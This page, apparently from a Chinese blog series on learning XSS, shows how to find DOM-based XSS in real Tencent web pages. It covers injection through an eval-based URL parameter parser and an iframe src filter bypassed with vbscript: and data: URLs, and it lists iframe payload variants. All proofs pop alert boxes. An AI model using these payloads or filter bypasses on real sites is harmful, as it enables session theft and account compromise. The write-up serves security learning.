@@ -1,0 +1,97 @@
+<html>
+<head>
+	
+	<title>(level 9)深入源码，遇见eval和iframe -- XSS升级之路</title>
+	<meta name="keywords" content="Just do, Just for fun" />
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+    <!--<link rel="stylesheet" href="/css/main.css" type="text/css">
+-->
+	<link href="/css/main.css?v=2" rel="stylesheet" type="text/css" />
+    <!--<link rel="stylesheet" href="/css/style.css" type="text/css">
+-->
+    
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">
+
+    
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2"/>
+    
+
+</head>
+
+<body>
+
+<h1 id="深入源码，邂逅eval和iframe">深入源码，邂逅eval和iframe</h1>
+<p>前边的分析过程，看起来还是比较浅，不论是直接在源码中出现的，还是在elements 中出现的，他们都是通过JavaScript 的document.write 或者是 innerHTML 输出到网页去了，所以还是可以轻松的在开发者工具那里看到输出的位置。但是，如果一部分输出，最终没有流向innerHTML 或者是 document.write，就需要安心下来慢慢挖掘了。</p>
+<p>腾讯的栗子：<br><a href="http://kf.qq.com/search_app.shtml?key=aaaaa" target="_blank" rel="external">http://kf.qq.com/search_app.shtml?key=aaaaa</a></p>
+<p>跑去源码和开发者工具里搜索一通，都没有搜索到，下面，我们换个思路，进入console 中，看能否发现一些。我们按照往常，在URL 的参数里，构造一些特殊字符，单引号，双引号，尖括号，斜杠，一般来说，双引号单引号都会最早被过滤，所以一般斜杠的几率还大一些。我们构建之后，查看结果返回一个错误的信息：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-24-14640909121568.jpg" alt=""><br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-24-14640909234736.jpg" alt=""></p>
+<p>右边能点开帮助文档，能看到源文件，那我们进源文件好好看看到底哪里出错了，有没有机会绕过。我们定位到代码的位置，上下文大约如此：</p>
+<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> getarg = <span class="function"><span class="keyword">function</span><span class="params">()</span></span></div><div class="line"></div><div class="line">{</div><div class="line">	<span class="keyword">var</span> url = <span class="built_in">window</span>.location.href;</div><div class="line">	<span class="keyword">var</span> allargs = url.split(<span class="string">"?"</span>)[<span class="number">1</span>];</div><div class="line">	<span class="keyword">if</span> (allargs!=<span class="literal">null</span> && allargs.indexOf(<span class="string">"="</span>)&gt;<span class="number">0</span>)</div><div class="line">	{</div><div class="line">		<span class="keyword">var</span> args = allargs.split(<span class="string">"&"</span>);</div><div class="line">		<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;args.length; i++)</div><div class="line">		{</div><div class="line">			<span class="keyword">var</span> arg = args[i].split(<span class="string">"="</span>);</div><div class="line">			<span class="built_in">eval</span>(<span class="string">'this.'</span>+arg[<span class="number">0</span>]+<span class="string">'="'</span>+arg[<span class="number">1</span>]+<span class="string">'";'</span>);</div><div class="line">		}</div><div class="line">	}</div><div class="line">};</div></pre></td></tr></table></figure>
+
+<p>这就是最简单的从URL 中获取参数的代码，url 是原始的url,allargs 是问号之后的参数部分，然后通过&amp; 分割的开来，然后对URL 中每一个参数键值对，用一个eval 来执行记录操作，也就是执行了eval(‘this.key’=”aaaa”;’)，eval(‘this.’+arg[0]+’=”‘+arg[1]+’”;’);两个参数分别对应了等号左右的键和值，虽然我们没有在页面里看到输出，但是它实际上还是输出了。</p>
+<p>那么，我们不仅可以对值进行替换，还可以对键进行替换尝试，我们先替换一下arg[0] 试试：</p>
+<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.key=<span class="string">"aaaa"</span>;</div><div class="line"><span class="keyword">this</span>.key;alert(<span class="number">1</span>);<span class="comment">//="aaaa";</span></div></pre></td></tr></table></figure>
+
+<p>变成上式那样的，就可以弹窗了，双斜杠形成注释，截掉了后边的内容。测试一下这个URL：<br><a href="http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaa" target="_blank" rel="external">http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaa</a></p>
+<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-24-14640923929508.jpg" alt=""></p>
+<p>弹弹弹，那么后边的值部分可以不可以呢。</p>
+<p>按照惯常思路，使用双引号闭合，然后加入利用函数：</p>
+<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.key=<span class="string">"aaaa"</span>;</div><div class="line"><span class="keyword">this</span>.key=<span class="string">"aaaa"</span>;alert(<span class="number">1</span>);<span class="comment">//";</span></div></pre></td></tr></table></figure>
+
+<p>构造出来的URL：<br><a href="http://kf.qq.com/search_app.shtml?key=aaa&quot;;alert(1);//" target="_blank" rel="external">http://kf.qq.com/search_app.shtml?key=aaa&quot;;alert(1);//</a></p>
+<p>但是，对于chrome等非IE 浏览器，实际上，对于URL 出现的双引号，会将其进行URL 编码，在HTML 解析的时候，无法完成正常的语法结构，也就失效了，不过上述代码在IE下是有效的。</p>
+<p>下面我们再发现输出在iframe中的，因为iframe 后边可以跟src ，有时候为了方便嵌套小框架，会从URL里读取参数，然后构造成地址，输出在iframe 的src 中，形如：&lt; iframe src=”[输出]”&gt;&lt; /iframe&gt;。</p>
+<p>但是，对于src 来说，我们可以插入伪URL ，来执行JS 代码，常见的插入在前边也说过，对于iframe 可以有以下几种：</p>
+<ul>
+<li>&lt; iframe onload=”alert(1)”&gt;&lt; /iframe&gt;</li>
+<li>js伪url: &lt; iframe src=”javascript:alert(1)”&gt;&lt; /iframe&gt;</li>
+<li>IE下的vbscript执行代码： &lt; iframe src=”vbscript:msgbox(1)”&gt;&lt; /iframe&gt; </li>
+<li>Chrome 下data的协议执行代码：&lt; iframe src=”data:text/html,&lt; script&gt;alert(1)&lt; /script&gt;”&gt;&lt; /iframe&gt;</li>
+<li>如果尖括号被屏蔽，还可以使用HTML 实体编码：&lt; iframe src=”data:text/html,&amp;lt ;script&amp;gt ;alert(1)&amp;lt ;/script&amp;gt ;”&gt;&lt; /iframe&gt;</li>
+<li>以及Chrome下srcdoc属性:&lt; iframe srcdoc=”&amp;lt ; script&amp;gt ;alert(1)&amp;lt ;/script&amp;gt ;”&gt;&lt; /iframe&gt;</li>
+</ul>
+<p>下面继续从乌云上的栗子开始学习：<br><a href="http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&amp;gid=yl&amp;cid=68&amp;from=" target="_blank" rel="external">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&amp;gid=yl&amp;cid=68&amp;from=</a></p>
+<p>仍然使用最简单的方式去开发者工具里找输出，看到被带到了iframe 的src 中去：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-24-14640940633944.jpg" alt=""></p>
+<p>尝试用最简单的方式构造一个弹窗：<br><a href="http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);&amp;gid=yl&amp;cid=68&amp;from=" target="_blank" rel="external">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);&amp;gid=yl&amp;cid=68&amp;from=</a><br>结果失效：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-24-14640940998030.jpg" alt=""></p>
+<p>看来是被过滤掉了，那么寻找到这个iframe 的处理操作，去找找问题，在js 源码里，找到了相关的处理：</p>
+<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">OpenFrame</span><span class="params">(url)</span> </span>{</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (url.toLowerCase().indexOf(<span class="string">'http://'</span>) != <span class="string">'-1'</span> || url.toLowerCase().indexOf(<span class="string">'https://'</span>) != <span class="string">'-1'</span> || url.toLowerCase().indexOf(<span class="string">'javascript:'</span>) != <span class="string">'-1'</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">	<span class="built_in">document</span>.getElementById(<span class="string">"toolframe"</span>).src = url;</div><div class="line"></div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>实际上，他做了最简单的过滤，仅仅是不允许JavaScript 伪URL，而url 参数，我们寻找turl 参数，源码中，并没再做更多操作：</p>
+<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> tool_url = getQueryStringValue(<span class="string">"turl"</span>);</div><div class="line">...</div><div class="line">openFrame(tool_url);</div></pre></td></tr></table></figure>
+
+<p>那么我们就可以用上边说的使用VBScript来在IE 下XSS，可以在Chrome 中用date 来构造XSS。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">IE： http://helper.qq.com/appweb/tools/tool-detail.shtml?<span class="variable">turl=</span>vbscript:msgbox(<span class="number">1</span>)'&<span class="variable">gid=</span>yl&<span class="variable">cid=</span><span class="number">68</span>&<span class="variable">from=</span></div><div class="line"></div><div class="line">Chrome: http://helper.qq.com/appweb/tools/tool-detail.shtml?<span class="variable">turl=</span>data:text/html,&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;'&<span class="variable">gid=</span>yl&<span class="variable">cid=</span><span class="number">68</span>&<span class="variable">from=</span></div></pre></td></tr></table></figure>
+
+
+
+<!--<a href="http://yoursite.com/2016/05/24/-level-9-深入源码，遇见eval和iframe-XSS升级之路/#disqus_thread" class="article-comment-link">Comments</a>-->
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'null'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+<div style="display:none">
+<script src="http://s4.cnzz.com/stat.php?id=undefined&web_id=undefined" language="JavaScript"></script>script>
+</div>
+
+
+
+
+
+
+
+</body>
+</html>
